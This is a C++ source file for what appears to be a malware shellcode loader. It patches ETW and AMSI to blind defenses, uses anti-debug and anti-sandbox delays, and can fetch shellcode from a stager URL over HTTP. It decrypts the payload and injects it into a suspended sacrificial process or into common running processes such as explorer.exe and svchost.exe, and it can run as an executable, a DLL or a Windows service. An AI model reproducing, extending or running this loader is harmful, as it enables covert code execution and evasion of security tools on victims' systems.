#include "config.hpp"
#include "malapi.hpp"

#ifndef _DEBUG
#pragma comment(linker, "/ENTRY:entry")
#endif

VOID entry(void)
{
	DWORD	pid = 0;
	HANDLE	process_handle = INVALID_HANDLE_VALUE;
	HANDLE	additional_handle = INVALID_HANDLE_VALUE;

#pragma region Guard Rails

#pragma endregion

#pragma region Evasion

#if ANTI_DEBUG_ENABLED

	while (malapi::IsDebuggerPresent())
	{
		LOG_ERROR("Currently being debugged. Sleeping...");
		SleepMethod(SLEEP_TIME);
	}

#endif

#if ANTI_SANDBOX_ENABLED
	SleepMethod(SLEEP_TIME);
#else
#endif

	//#if ANTI_SANDBOX_ENABLED
	//#else
	//#endif

#if PATCH_ENABLED_ETW

#if PATCH_METHOD_ETW == 1
	malapi::PatchEtwSsn();
#else
	malapi::PatchEtwEventWrite();
#endif

#else
#endif

#if PATCH_ENABLED_AMSI

#if PATCH_METHOD_AMSI == 1
	malapi::PatchAmsiScanBuffer();
#else
#endif

#else
#endif

#pragma endregion

#if CONFIG_STAGE_METHOD == 2
	PBYTE downloaded_shellcode = NULL;
	SIZE_T shellcode_size = NULL;

	if (!malapi::StageShellcodeHttp(STAGER_URL, STAGER_FILE, STAGER_SSL, &downloaded_shellcode, &shellcode_size))
	{
		LOG_ERROR("Failed to download shellcode.");
		return;
	}

	unsigned char* shellcode = downloaded_shellcode;
#else
	SIZE_T shellcode_size = sizeof(shellcode);
#endif

#if ANTI_SANDBOX_ENABLED
	SleepMethod(SLEEP_TIME);
#endif

#if CONFIG_CREATE_PROCESS_METHOD == 1
	LPCSTR file_path = CONFIG_SACRIFICIAL_PROCESS;
	malapi::CreateSuspendedProcess((LPSTR)CONFIG_SACRIFICIAL_PROCESS, &process_handle, &additional_handle);

#elif CONFIG_CREATE_PROCESS_METHOD == 2
	//
	// ProcessHollowing
	// InjectionAddressOfEntryPoint
	// DoppleGanging
	//
	LPCSTR file_path = CONFIG_SACRIFICIAL_PROCESS;

	SleepMethod(SLEEP_TIME);

	DecryptShellcode(shellcode, shellcode_size, key, sizeof(key));

	process_handle = malapi::EntryPointHandle((LPSTR)file_path, shellcode, sizeof(shellcode)); // thread handle

#else
	constexpr ULONG targets[] = {
		//malapi::HashStringFowlerNollVoVariant1a("notepad.exe"), // dev win 10
		//malapi::HashStringFowlerNollVoVariant1a("Notepad.exe"), // dev win 11
		malapi::HashStringFowlerNollVoVariant1a("Spotify.exe"),
		malapi::HashStringFowlerNollVoVariant1a("slack.exe"),
		malapi::HashStringFowlerNollVoVariant1a("PerfWatson2.exe"),
		malapi::HashStringFowlerNollVoVariant1a("SteelSeriesGG.exe"),
		malapi::HashStringFowlerNollVoVariant1a("GoogleDriveFS.exe"),
		malapi::HashStringFowlerNollVoVariant1a("steamwebhelper.exe"),
		malapi::HashStringFowlerNollVoVariant1a("slpwow64.exe"),
		malapi::HashStringFowlerNollVoVariant1a("sihost.exe"),
		malapi::HashStringFowlerNollVoVariant1a("msiexec.exe"),
		malapi::HashStringFowlerNollVoVariant1a("WerFault.exe"),
		malapi::HashStringFowlerNollVoVariant1a("werfault.exe"),
		malapi::HashStringFowlerNollVoVariant1a("devenv.exe"),
		malapi::HashStringFowlerNollVoVariant1a("cloudflared.exe"),
		malapi::HashStringFowlerNollVoVariant1a("svchost.exe"), // if all else fails
		malapi::HashStringFowlerNollVoVariant1a("explorer.exe"), // if all else fails
	};

	pid = malapi::GetPidFromHashedList((DWORD*)targets, sizeof(targets));

	if (pid == NULL)
	{
		LOG_ERROR("Error getting Process ID.");
		return;
	}
	LOG_SUCCESS("Process ID: %d", pid);
	process_handle = malapi::GetProcessHandle(pid);

	SleepMethod(SLEEP_TIME);

	DecryptShellcode(shellcode, shellcode_size, key, sizeof(key));

#endif

#if ANTI_DEBUG_ENABLED

	malapi::HideFromDebugger(additional_handle);
	malapi::HideFromDebugger(process_handle);

	while (malapi::IsRemoteDebuggerPresent(process_handle))
	{
		LOG_ERROR("Currently being debugged remotely. Sleeping...");
		SleepMethod(SLEEP_TIME);
	}

#endif

	SleepMethod(SLEEP_TIME);

	DecryptShellcode(shellcode, shellcode_size, key, sizeof(key));

	if (!ExecuteShellcode(process_handle, shellcode, shellcode_size, additional_handle))
	{
		LOG_ERROR("Failed to execute shellcode.");
		return;
	}
	LOG_SUCCESS("Executing Shellcode");
}

#pragma region [alternate entrypoints]

#if _DEBUG

#if CONFIG_COMPILATION_OPTION == 1

int main(void) { entry(); return 0; }

#elif CONFIG_COMPILATION_OPTION == 2

BOOL APIENTRY WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
	{
		entry();
		break;
	}

	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
	{
		if (lpvReserved != nullptr)
		{
			break;
		}
		break;
	}
	}
	return TRUE;
}

#elif CONFIG_COMPILATION_OPTION == 3

//
// Services https://learn.microsoft.com/en-us/windows/win32/services/writing-a-service-program-s-main-function
//
#define SVCNAME TEXT("AbleSvc")
SERVICE_STATUS_HANDLE StatusHandle = { 0 };
SERVICE_STATUS        SvcStatus = {
	SERVICE_WIN32_OWN_PROCESS,
	SERVICE_START_PENDING,
	SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN,
	NO_ERROR,
	0,
	0,
	0
};

HANDLE ghSvcStopEvent = NULL;

VOID ReportSvcStatus(DWORD current_state, DWORD exit_code, DWORD wait_hint)
{
	SvcStatus.dwCurrentState = current_state;
	SvcStatus.dwWin32ExitCode = exit_code;
	SvcStatus.dwWaitHint = wait_hint;

	if (exit_code == SERVICE_START_PENDING)
		SvcStatus.dwControlsAccepted = 0;
	else
		SvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;

	SetServiceStatus(StatusHandle, &SvcStatus);
}

VOID WINAPI SvcCtrlHandler(DWORD control_code)
{
	switch (control_code)
	{
	case SERVICE_CONTROL_STOP:
	case SERVICE_CONTROL_SHUTDOWN:
		ReportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);
		SetEvent(ghSvcStopEvent);
		ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
		return;

	default:
		break;
	}

	SetServiceStatus(StatusHandle, &SvcStatus);
}

VOID WINAPI SvcMain(DWORD dwArgc, LPTSTR* lpszArgv)
{
	StatusHandle = RegisterServiceCtrlHandler(SVCNAME, SvcCtrlHandler);

	if (!StatusHandle)
	{
		return;
	}

	ReportSvcStatus(SERVICE_START_PENDING, NO_ERROR, 3000);

	ghSvcStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	if (ghSvcStopEvent == NULL)
	{
		ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
		return;
	}

	ReportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0);

	entry();

	WaitForSingleObject(ghSvcStopEvent, INFINITE);

	CloseHandle(ghSvcStopEvent);
	ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
}

int main(void)
{
	SERVICE_TABLE_ENTRY DispatchTable[] =
	{
		{ (LPWSTR)SVCNAME, (LPSERVICE_MAIN_FUNCTION)SvcMain },
		{ NULL, NULL }
	};

	if (!StartServiceCtrlDispatcher(DispatchTable))
	{
		return 1;
	}

	return 0;
}

// Release
/*
VOID ReportSvcStatus(DWORD current_state, DWORD exit_code, DWORD wait_hint)
{
	HMODULE advapi32 = NULL;

	constexpr ULONG hash_setservicestatus = malapi::HashStringFowlerNollVoVariant1a("SetServiceStatus");

	advapi32 = malapi::LoadLibraryC("Advpapi32.dll");

	typeSetServiceStatus SetServiceStatus = (typeSetServiceStatus)malapi::GetProcAddressC(advapi32, hash_setservicestatus);

	SvcStatus.dwCurrentState = current_state;
	SvcStatus.dwWin32ExitCode = exit_code;
	SvcStatus.dwWaitHint = wait_hint;

	if (exit_code == SERVICE_START_PENDING)
		SvcStatus.dwControlsAccepted = 0;
	else
		SvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;

	SetServiceStatus(StatusHandle, &SvcStatus);
}

VOID WINAPI SvcCtrlHandler(DWORD control_code)
{
	HMODULE advapi32 = NULL;

	constexpr ULONG hash_setevent = malapi::HashStringFowlerNollVoVariant1a("SetEvent");
	constexpr ULONG hash_setservicestatus = malapi::HashStringFowlerNollVoVariant1a("SetServiceStatus");

	advapi32 = malapi::LoadLibraryC("Advpapi32.dll");

	typeSetEvent SetEvent = (typeSetEvent)malapi::GetProcAddressC(advapi32, hash_setevent);
	typeSetServiceStatus SetServiceStatus = (typeSetServiceStatus)malapi::GetProcAddressC(advapi32, hash_setservicestatus);

	switch (control_code)
	{
	case SERVICE_CONTROL_STOP:
	case SERVICE_CONTROL_SHUTDOWN:
		ReportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);
		SetEvent(ghSvcStopEvent);
		ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
		return;

	default:
		break;
	}

	SetServiceStatus(StatusHandle, &SvcStatus);
}

VOID WINAPI SvcMain(DWORD dwArgc, LPTSTR* lpszArgv)
{
	StatusHandle = malapi::RegisterServiceCtrlHandler(SVCNAME, SvcCtrlHandler);

	if (!StatusHandle)
	{
		return;
	}

	ReportSvcStatus(SERVICE_START_PENDING, NO_ERROR, 3000);

	ghSvcStopEvent = malapi::CreateEvent(NULL, TRUE, FALSE, NULL);
	if (ghSvcStopEvent == NULL)
	{
		ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
		return;
	}

	ReportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0);

	entry();

	malapi::WaitForSingleObject(ghSvcStopEvent, INFINITE);

	malapi::CloseHandle(ghSvcStopEvent);
	ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
}

int main(void)
{
	SERVICE_TABLE_ENTRY DispatchTable[] =
	{
		{ (LPWSTR)SVCNAME, (LPSERVICE_MAIN_FUNCTION)SvcMain },
		{ NULL, NULL }
	};

	if (!malapi::StartServiceCtrlDispatcher(DispatchTable))
	{
		return 1;
	}

	return 0;
}
*/
#endif

#endif

#pragma endregion
